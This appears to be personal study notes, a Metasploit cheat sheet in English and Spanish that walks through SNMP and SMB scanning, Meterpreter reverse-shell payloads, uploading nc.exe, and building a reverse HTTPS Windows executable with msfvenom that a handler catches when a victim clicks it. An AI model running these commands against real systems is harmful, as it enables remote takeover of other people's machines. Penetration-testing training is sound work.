---
title: metasploit basics  
category: basics
order: 1
---



# METASPLOIT
---

## setup
```
root@kali: service postgresql start
root@kali: service metasploit start
root@kali: msfconsole

   ```


## auxiliar modules
```
msf> show auxiliary  <-nos muestra lista
msf> search snmp
...
...
msf> use auxiliary/scanner/snmp/snmp_enum
msf  auxiliary> info
...
...
msf auxiliary> show options
msf auxiliary> set RHOST 192.168.58.10-20
msf auxiliary> SET THREADS 10
msf auxiliary> run
```



## smb auxiliary
```
   msf > use /../smb_version
   msf (smb_version)> show options
   msf (smb_version)> set RHOST 10.10.0.10-20
   msf (smb_version)> set  THREADS 10
   msf (smb_version)> run
```




#  PAYLOADS
---
## stage and non stage payload

stage: send in 2 parts    
nonstage: 1 payload to rule them all

## STAGE PAYLOAD (meterpreter)

basics
```
msf exploit(seattlelab)>set PAYLOAD windows/meterpreter/reverse_tcp
msf exploit(seattlelab)> show options
msf exploit(seattlelab)> exploit
....
meterpreter> help
...
meterpreter>sysinfo
...
meterpreter>getuid
...
meterpreter>search
...
```

uploading a file
```
  meterpreter> upload /usr/share/../nc.exe c:\\Users\\Offsec
```

downloading
```
  meterpreter> download c:\\Windows\\system32\\calc.exe /tmp/calc.exe
```
Shell
```
  meterpreter> shell
  ...
  c:\>
```  
exit
```
  c:\> exit
  meterpreter> exit -y
  msf(saras)> back
  msf >
```
## Additional payloads
```
  msf> use windows/meterpreter/reverse_https
  msf payload(revers_https) > info
  ...
  msf > use windows/meterpreter/reverse_tcp_allports
  msf payload(reverse_tcp_allports)> info
```

## Generate a binary payload

```
   msf> msfvenom -l <lista todos los payloads
```
   we chose one ex: windows/meterpreter/reverse_https
```
   msf> msfvenom -p <payload ej reverse>  LHOST=<kali> LPORT=<PORT> -f exe --platform windows -a x86 > /var/www/reverse_met_https.exe
```

## multihandler
```
   root@kali: msfconsole
   msf >  use exploit/multi/handler
   msf exploit> set PAYLOAD windows/meterpreter/reverse_http (mismo que el binario)
   msf exploit> show options
   ....
   msf exploit> set LHOST < ip >
   msf exploit> set LPORT <port>
   msf exploit> exploit
   ...
   escuchando en 443
   ... cuando hagan click
   meterpreter> :)
```
